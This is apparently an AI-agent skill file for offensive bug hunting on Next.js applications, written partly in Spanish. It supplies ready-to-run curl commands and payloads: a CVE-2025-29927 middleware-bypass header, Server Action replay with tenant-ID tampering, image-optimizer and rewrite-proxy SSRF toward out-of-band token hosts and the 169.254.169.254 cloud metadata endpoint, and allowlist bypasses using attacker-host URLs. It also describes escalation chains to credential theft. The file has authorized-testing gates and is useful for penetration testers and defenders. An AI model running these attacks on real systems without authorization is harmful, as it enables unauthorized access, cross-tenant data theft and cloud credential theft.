---
name: nextjs
description: >
  Hunt for Next.js-specific weaknesses: Server Action abuse (unauthenticated action IDs,
  argument tampering), middleware auth bypass (CVE-2025-29927 x-middleware-subrequest), image
  optimizer SSRF (/_next/image?url=), data/source-map leaks under /_next/ (RSC payloads,
  __NEXT_DATA__, .map files), and SSRF via rewrites/proxies in next.config. Use when the target
  is a Next.js app (App Router or Pages Router) — look for /_next/, __NEXT_DATA__, RSC flight
  payloads, Server Action POST bodies, or x-powered-by/next headers. Keywords: nextjs, next.js,
  server actions, rsc, react server components, middleware bypass, x-middleware-subrequest,
  _next/image, image optimizer ssrf, __NEXT_DATA__, next data leak, rewrites ssrf, app router.
  Do NOT use for generic SSRF (use ssrf) or Node-runtime issues not specific to Next (use nodejs).
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-918, CWE-285, CWE-200, CWE-639]
  mitre_attack: [T1190, T1212, T1552.001]
  tools: [curl, ffuf, burp, interactsh, nuclei]
depends_on: [active-recon, tech-stack-fingerprint, web-crawling, js-analysis]
feeds_into: [chain-analysis, info-disclosure, rce]
chains_with: [ssrf, auth-bypass, broken-access-control, info-disclosure]
---

## Signals

- `/_next/static/`, `/_next/data/`, `/_next/image` paths; `__NEXT_DATA__` script blob in HTML;
  RSC "flight" payloads (lines beginning `0:`, `1:`, `self.__next_f.push(...)`).
- Response headers `x-powered-by: Next.js`, `x-nextjs-cache`, `x-nextjs-prerender`, or a
  `Vary: RSC, Next-Router-State-Tree` combination.
- Server Action POST requests: a `POST` to a regular page route carrying header
  `Next-Action: <40-hex-id>` (App Router) or `content-type: text/plain;charset=UTF-8` with a
  serialized-args body, or multipart with `$ACTION_ID_...` fields.
- A `middleware.js`/`middleware.ts` edge layer doing auth/redirects (you infer it from 307/308
  redirects to `/login`, or `x-middleware-*` response headers).
- `next.config.js` `rewrites`/`redirects`/`images.domains` — rewrites that proxy to a backend URL
  derived from the request are an SSRF surface.

## Prerequisites

- Confirmed Next.js and, ideally, its major version (read `/_next/static/chunks/` filenames,
  `__NEXT_DATA__.buildId`, or a `next` version string in a sourcemap) — the middleware-bypass and
  image-SSRF behaviours are version-gated.
- For Server Actions: at least one observed `Next-Action` id from normal app traffic, and the
  ability to replay POSTs (Burp/curl).
- For blind SSRF (image optimizer, rewrites): an OOB listener with per-attempt token (see skill
  `oob-interactions` and `engine.oast`).

## Methodology

1. **Fingerprint surface and version.** Pull the build and router flavour before probing:
   ```bash
   curl -s https://target/ | grep -oE '"buildId":"[^"]+"|_next/static/[^"/]+' | sort -u
   curl -s -I https://target/ | grep -iE 'x-powered-by|x-nextjs|vary'
   # App Router apps emit RSC payloads; Pages Router apps emit a __NEXT_DATA__ JSON blob
   curl -s https://target/ | grep -o '__NEXT_DATA__' | head -1
   ```

2. **Middleware auth bypass (CVE-2025-29927).** Vulnerable versions skip middleware when the
   request carries an internal subrequest marker. Try to reach a route that middleware is
   supposed to gate (e.g. `/dashboard`, `/admin`) while asserting the marker:
   ```bash
   # baseline: should redirect/401
   curl -s -o /dev/null -w "%{http_code}\n" https://target/admin
   # bypass attempt: claim the request already passed middleware
   curl -s -o /dev/null -w "%{http_code}\n" https://target/admin \
     -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
   # App-Router nested form also seen: src/middleware or pages/_middleware segments
   curl -s -o /dev/null -w "%{http_code}\n" https://target/admin \
     -H 'x-middleware-subrequest: src/middleware:src/middleware:src/middleware'
   ```
   A 200 with gated content on the header request (vs redirect without) is Demonstrated bypass.
   The header value must match the middleware module path repeated to the depth the version
   checks — vary the segment and depth.

3. **Server Action abuse.** Actions are addressable by their `Next-Action` id regardless of which
   page currently renders a button for them; authorization lives inside the action body, not in
   routing. Enumerate and replay:
   ```bash
   # harvest action ids from client chunks (they appear as createServerReference('<hex>'))
   curl -s https://target/_next/static/chunks/ -o /dev/null   # dir listing usually off; grep chunks instead
   curl -s "https://target/_next/static/chunks/app/page-<hash>.js" | grep -oE "createServerReference\\(\"[0-9a-f]{40}\"" 
   # replay an action without visiting its page / without the UI-side guard
   curl -s -X POST https://target/any-rendered-route \
     -H 'Next-Action: <40-hex-id>' -H 'content-type: text/plain;charset=UTF-8' \
     --data '[{"targetUserId":"<other-tenant-id>"}]'
   ```
   Test: calling a privileged action (delete, role-change, export) from an unprivileged session,
   and tampering serialized arguments to reference other tenants' objects (overlaps idor/bac).

4. **Image optimizer SSRF (`/_next/image`).** The optimizer fetches `url=` server-side; if the
   allowlist (`images.domains`/`remotePatterns`) is missing, wildcarded, or bypassable, it is an
   SSRF primitive. Mint an OOB token first for blind confirmation:
   ```bash
   python3 -m engine.oast token --audit-dir . --purpose blind-ssrf --vuln-class nextjs \
     --target-url https://target/_next/image --parameter url
   curl -s -o /dev/null -w "%{http_code}\n" \
     "https://target/_next/image?url=http://TOKEN.DOMAIN.oast.site/&w=64&q=75"
   python3 -m engine.oast poll --audit-dir .
   # internal / metadata reach (response is re-encoded to an image, so prefer timing/OOB oracle)
   curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
     "https://target/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
   ```
   Note: the optimizer re-encodes to an image, so it is typically a **blind** SSRF — treat it like
   the ssrf skill's blind branch (OOB token mandatory; reflected bodies rare).

5. **`/_next/` data and source-map leaks.** Pull server-rendered props and maps that can carry
   secrets, internal IDs, or full source:
   ```bash
   # Pages Router data route exposes getServerSideProps output as JSON
   curl -s "https://target/_next/data/<buildId>/account.json" | head -c 2000
   # source maps (if shipped to prod) reconstruct original TS and may embed tokens/comments
   curl -s "https://target/_next/static/chunks/pages/_app-<hash>.js.map" | head -c 400
   # __NEXT_DATA__ / RSC payload often over-fetches: server props serialized into the HTML
   curl -s https://target/account | grep -o '__NEXT_DATA__.*</script>' | head -c 3000
   ```
   Look for API keys, internal hostnames, unredacted PII, feature flags, or object IDs usable for
   idor.

6. **SSRF / open-proxy via rewrites.** A `rewrites()` entry that forwards to a destination built
   from a path/query segment can be coerced to fetch attacker-chosen hosts:
   ```bash
   # if next.config rewrites /api/proxy/:path* -> https://backend/:path*, test host override
   curl -s "https://target/api/proxy/@TOKEN.DOMAIN.oast.site/" && python3 -m engine.oast poll --audit-dir .
   curl -s "https://target/api/proxy/..%2f..%2f@169.254.169.254/latest/meta-data/"
   ```
   Confirm via OOB token or an internal body that only a server-side fetch could reach.

7. **Confirm impact, stop at the gate.** Record the exact primitive (middleware bypass, action
   abuse, SSRF, leak) and what it reaches. Using harvested cloud credentials or dumping another
   tenant's data is a new scope boundary — get the operator gate first.

## Tooling

- `curl` / Burp Repeater — replay Server Actions and header-based bypasses precisely.
- `ffuf` — enumerate `/_next/data/<buildId>/*.json`, chunk hashes, and candidate action routes.
- `interactsh` / `engine.oast` — OOB confirmation for image-optimizer and rewrite SSRF (blind).
- `nuclei -tags nextjs` — triage known Next.js CVEs (verify version applicability; don't report on
  version match alone).
- Browser devtools / a source-map parser (e.g. `sourcemapper`) — reconstruct TS from shipped maps.

## Root Causes

- Trust in a client-controllable internal marker (`x-middleware-subrequest`) to decide whether
  middleware already ran — a header the edge should strip but doesn't (CVE-2025-29927).
- Authorization implemented only in UI/routing, not inside the Server Action; actions remain
  callable by id from any route and any session.
- Serialized Server Action arguments accepted without re-validating object ownership/type
  server-side (mass-assignment / idor through the action boundary).
- Image optimizer / rewrite proxy fetching request-derived URLs with no destination allowlist, or
  an allowlist defeated by `@`, path confusion, or wildcard `remotePatterns`.
- Source maps and verbose `getServerSideProps`/RSC payloads shipped to production, serializing
  secrets, internal IDs, and over-fetched records into client-reachable responses.

## Validation Gate (minimum proof)

- **Demonstrated:** gated content returned on the `x-middleware-subrequest` request but not
  without it (middleware bypass); a privileged Server Action executed from an unauthorized session
  with the state change shown; a token-correlated OOB hit (or genuine internal body) from
  `/_next/image` or a rewrite (SSRF); or a concrete secret/other-tenant record extracted from a
  `/_next/` data route, map, or `__NEXT_DATA__` blob. Payload + request/response included.
- **Inferred:** the action id is reachable and returns a different error than the UI path (guard
  likely client-side only) but no privileged effect driven yet; a single image-optimizer timing
  delta toward an internal host with no OOB match; a version matching a CVE with partial but not
  conclusive trigger behaviour.
- **Unproven:** "runs Next.js version X, therefore CVE-2025-29927" with no bypass reproduced, or a
  present source map with no sensitive content extracted. Do not report.
- Name the exact mechanism (middleware / action / optimizer / rewrite / leak) — remediation differs
  per primitive.

## Payloads & Detection Patterns

Guía de caza: una familia por primitiva de Next. Para los vectores SSRF (optimizer, rewrites) el
único camino a `Demonstrated` ciego es un hit correlacionado por token en el gate OOB.

| Categoría | Shape | Propósito |
|---|---|---|
| Middleware bypass | header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` | Saltar auth/redirect del edge (CVE-2025-29927) |
| Server Action replay | `POST /<ruta>` + `Next-Action: <40-hex>` + body `[{...args}]` | Invocar acción privilegiada sin su UI/guard |
| Action arg tampering | `--data '[{"id":"<otro-tenant>"}]'` | idor/mass-assignment por la frontera de la acción |
| Image optimizer SSRF | `/_next/image?url=http://TOKEN.DOMAIN/&w=64&q=75` | Fetch server-side a interno/IMDS (ciego) |
| Data route leak | `/_next/data/<buildId>/<page>.json` | Props server-side (secretos, IDs, PII) |
| Source-map leak | `/_next/static/chunks/*.js.map` | Reconstruir TS + secretos embebidos |
| Rewrite proxy SSRF | `/api/proxy/@TOKEN.DOMAIN/` o `..%2f@169.254.169.254/` | Reusar el proxy del rewrite como SSRF |

Surface signals que delatan la clase antes de inyectar:
- URL: `/_next/image?url=`, `/_next/data/<buildId>/`, `/_next/static/chunks/*.js.map`, rutas de
  rewrite tipo `/api/proxy/*`.
- JS: `createServerReference("<hex>")`, `self.__next_f.push(`, `__NEXT_DATA__`, `buildId` en chunks.
- Headers: `Next-Action` (request), `x-powered-by: Next.js`, `x-nextjs-*`, `Vary: RSC`.

```bash
# detección de versión y router (barato, sin tocar estado)
curl -s https://target/ | grep -oE '"buildId":"[^"]+"' | head -1
curl -s -I https://target/ | grep -iE 'x-powered-by: *next|x-nextjs'
```

```bash
# diferencial de middleware bypass: compara código con y sin el marcador interno
base=$(curl -s -o /dev/null -w "%{http_code}" https://target/admin)
byp=$(curl -s -o /dev/null -w "%{http_code}" https://target/admin \
  -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware')
echo "sin_header=$base con_header=$byp"   # 302/401 -> 200 = bypass candidato, confirmar contenido
```

```bash
# SSRF ciego del optimizer con token OAST (gate obligatorio)
python3 -m engine.oast token --audit-dir . --purpose blind-ssrf --vuln-class nextjs \
  --target-url https://target/_next/image --parameter url
curl -s -o /dev/null "https://target/_next/image?url=http://TOKEN.DOMAIN.oast.site/&w=64&q=75"
python3 -m engine.oast poll --audit-dir .    # hit correlacionado = Demonstrated
```

## Bypass Techniques

Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.

| Filtro evadido | Técnica | Notas |
|---|---|---|
| Edge debería stripear el marcador | Variar el path del módulo y la profundidad: `middleware`, `src/middleware`, `pages/_middleware`, repetido N veces | La versión chequea una profundidad concreta; barrer 1–6 repeticiones |
| Guard de acción solo en UI | Llamar el `Next-Action` id desde cualquier ruta renderizada, sin cargar su página | La autorización vive en el body de la acción, no en el routing |
| `images.domains` allowlist | `url=https://allowed.com@attacker/`, `url=//attacker/`, o host en `remotePatterns` con wildcard | Discrepancia entre validador de host y el fetch real |
| Allowlist de rewrite por prefijo | `@host` tras el segmento, `..%2f` traversal, doble slash | El destino se arma por concatenación de path |
| Source maps "no servidos" | Pedir `.js.map` directo aunque no esté referenciado | A veces quedan desplegados sin link |
| Data route oculta | Reconstruir `buildId` desde `__NEXT_DATA__` y pedir `/_next/data/<buildId>/<page>.json` | Expone props de páginas no enlazadas |

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Middleware bypass → broken-access-control** — Does the bypassed route expose admin
   functionality, other tenants' data, or internal APIs? Chain broken-access-control / idor.
2. **Server Action → mass-assignment / idor** — Can tampered action arguments write fields or
   reference objects the caller should not own?
3. **Image optimizer / rewrite SSRF → cloud metadata** — Does the SSRF primitive reach
   169.254.169.254 or internal services? Chain ssrf → cloud credential theft (gate before use).
4. **`/_next/` leak → credential reuse** — Do leaked props/maps contain API keys, tokens, or
   internal hostnames usable elsewhere? Chain info-disclosure → credential-testing.
5. **Action-reachable RCE surface** — Does an action deserialize or shell out? Probe rce only with
   explicit authorization.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Middleware bypass → **auth-bypass** → **broken-access-control** (reach every route the edge
  guarded).
- Server Action replay + argument tampering → **idor** / **mass-assignment** → account/tenant
  takeover.
- `/_next/image` or rewrite SSRF → **ssrf** → cloud metadata credential theft (new scope — stop
  and escalate per Human gates).
- `/_next/` data/source-map leak → **info-disclosure** → **credential-testing** with leaked keys.
- Leaked internal object IDs from `__NEXT_DATA__` feed **idor** enumeration on API routes.

## Gotchas

- **Minimum proof, not tenant dump.** One bypassed admin route or one cross-tenant action is the
  finding. Dumping the dataset is a new scope boundary — stop and get an operator gate.
- **CVE-2025-29927 is version-gated.** The accepted marker format and whether the edge strips it
  vary by Next version and hosting (self-hosted vs. a platform that sanitizes the header). A
  version match is Unproven until you reproduce gated content on the header request.
- **Image optimizer is usually blind.** It re-encodes the fetched bytes to an image, so you rarely
  get a reflected internal body — rely on the OOB token or a reliable timing oracle, and label
  accordingly; don't claim response-reflected SSRF.
- **Action ids rotate per build.** A harvested `Next-Action` id is tied to a `buildId`; after a
  deploy it changes. Re-harvest from current chunks rather than reusing stale ids.
- **Common N/A:** middleware only sets non-security headers / i18n routing — bypassing it has no
  authz impact; record tested-and-safe.
- **Overclaim trap:** a present `.js.map` is not a finding by itself — only what it reveals
  (secrets, internal endpoints) is. An empty-ish map is Unproven.
